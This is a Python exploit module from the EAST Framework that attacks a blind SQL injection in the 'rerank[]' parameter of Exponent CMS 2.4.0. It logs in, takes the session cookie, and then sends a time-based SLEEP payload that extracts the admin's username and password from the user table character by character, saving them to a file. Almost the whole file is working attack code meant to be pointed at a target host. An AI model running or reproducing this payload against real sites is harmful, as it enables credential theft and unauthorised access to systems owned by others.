#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import urllib2
import string
import cookielib
from collections import OrderedDict

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_exponent_cms_bsqli"
INFO['DESCRIPTION'] = "Blind SQL Injection Vulnerability in Exponent CMS 2.4.0"
INFO['VENDOR'] = "http://www.exponentcms.org/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://ru.0day.today/exploit/26303']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """
Blind SQL Injection vulnerability in 'rerank[]' POST parametr
"""
INFO['CHANGELOG'] = "11 Nov 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.207', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target Port')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')
OPTIONS["BASEPATH"] = '/exponent-2.4.0', dict(description = 'Path of Exponent CMS')
OPTIONS["TTL"] = 5, dict(description = '')
OPTIONS["USERNAME"] = 'admin', dict(description = 'Username')
OPTIONS["PASSWORD"] = 'password', dict(description = 'Password')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.ssl = False
        self.port = port
        self.host = host
        self.ttl = 5
        self.username = OPTIONS["USERNAME"]
        self.password = OPTIONS["PASSWORD"]
        self.basepath = '/exponent'
        self.pool = string.ascii_letters + string.digits + ':'
        self.cookiesjar = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookiesjar))
        urllib2.install_opener(opener)
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.ssl = bool(self.args.get('SSL', self.ssl))
        self.ttl = int(self.args.get('TTL', self.ttl))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.url = self.make_url('/exponent-2.4.0/index.php')
        self.data = "action=manage_ranks&controller=container&lastpage=http://192.168.1.207/exponent-2.4.0/untitled&model=container&rerank[]=alesha/' AND (SELECT * FROM (select IF((SUBSTRING((SELECT CONCAT(username,CHAR(58),password) FROM exponent_user where id=1),{pos},1)) = CHAR({char}), SLEEP(5), '1'))A) AND 'a'='a&src=@section1"
        
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    def make_data(self):
        data = ''
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="controller"\r\n\r\n'
        data += 'login\r\n'
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="src"\r\n\r\n\r\n'
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="int"\r\n\r\n\r\n'
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="action"\r\n\r\n'
        data += 'login\r\n'
        data += '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="username"\r\n\r\n'
        data += self.username
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="password"\r\n\r\n'
        data += self.password
        data += '\r\n--o0oOo0o--\r\n'
        return data
    
    def guess_letter(self, pos):
        for c in self.pool:
            data = self.data.format(pos = pos, char = ord(c))
            request = urllib2.Request(self.url, data)
            request.add_header('Cookie', self.cookies + 'admin_sidebarMode=automatic; student_sidebarMode=automatic;')
            start = time.time()
            try:
                urllib2.urlopen(request).read()
            except:
                pass
            if time.time() - start >= self.ttl:
                return c
        return None
        
    def run(self):
        self.args()
        self.log('')
        
        data = self.make_data()
        request = urllib2.Request(self.url, data)
        request.add_header('Content-Length', len(data))
        request.add_header('Content-Type', 'multipart/form-data; boundary=o0oOo0o')
        try:
            fd = urllib2.urlopen(request)
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        for k in self.cookiesjar:
            if k.name == 'PHPSESSID':
                self.cookies = '{}={};'.format(k.name, k.value)
        self.log(self.cookies)
        self.log('Begin extracting admin\'s credentials')
        self.log('This may take about 15 minutes')
        
        i, result = 1, ''
        char = self.guess_letter(i)
        while char:
            i += 1
            result += char
            self.log('Current result: ' + result)
            char = self.guess_letter(i)
        
        if result:
            self.log('End with: {}'.format(result))
            self.writefile(result)
            self.finish(True)
            return 1
        
        self.log('Failed')
        self.finish(False)
        return 0

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()